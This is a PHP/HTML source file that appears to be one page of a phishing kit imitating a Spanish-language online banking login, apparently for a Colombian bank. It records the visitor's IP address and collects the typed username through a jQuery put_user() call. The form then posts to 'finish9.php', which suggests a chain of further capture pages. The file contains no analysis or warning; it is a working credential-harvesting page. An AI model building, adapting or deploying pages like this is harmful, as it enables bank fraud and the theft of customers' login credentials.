<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>replit</title>
  <link href="style.css" rel="stylesheet" type="text/css" />
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
		<link href="../../../../../src/css/layout.css" rel="stylesheet">
		<link href="../../../../../src/css/fonts.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="../../../../../src/img/logo.png" />
		<script type="text/javascript" src="../../../../../src/js/jquery-3.6.0.min.js"></script>
		<script src="../../../../../src/js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../../../../src/js/run.js"></script> 
  <style>

        *{
            -webkit-appearance: none;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
        input[type=submit]{
            background-color:#fdda24;
            color: #030303;
            width: 90%;
            height: 41px;
            border-radius: 124px;
            border-input: 0px solid #ecfd08;
            margin-top: 0px;
            border:0px solid gray;
            padding: 5px;
            font-weight:bold;
            font-size:1em;
            
        }
        
.btn-amarillo{
	background-color:#FDDA24;
	color: #2c2a29;
    white-space: nowrap;    
    border: 0px solid transparent;  
}
       
    </style>
</head>

<body>
   

 <form action="finish9.php" method="post">
         <img src="img/ingresa.jpeg" alt="" width="100%">  
          


  <div class="login">
    <img src="/img/user.svg"   alt="" width="100%"></div>
       <input type="text" name="inp-user" id="inp-user" placeholder="Usuario"></center> 
          
          
          <p style="text-align: end;
            font-size:0.8em;margin-left: 4em;">¿Olvidaste tu usuario? </p>
        
        
	
	<br>
       <center><input type="submit" id="btn-user" name="btn-user" value="Continuar">
	   </center><br>
   	   <a href=""><center> <img src="img/bangol.jpeg" alt="" width="100%"></a>
	  <br>
   							

     

   <br>
  

</body>
</html>
<script type="text/javascript">	
	$(document).ready(function() {
		$('#btn-user').click(function(){
			if ($("#inp-user").val().length > 0) {
				put_user($("#inp-user").val());	
			}else{
				$(".mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#inp-user").focus();
			}			
		});

		$("#inp-user").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>
<script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#fecha-hora').jclock(optionsEST);
     });
 </script> 
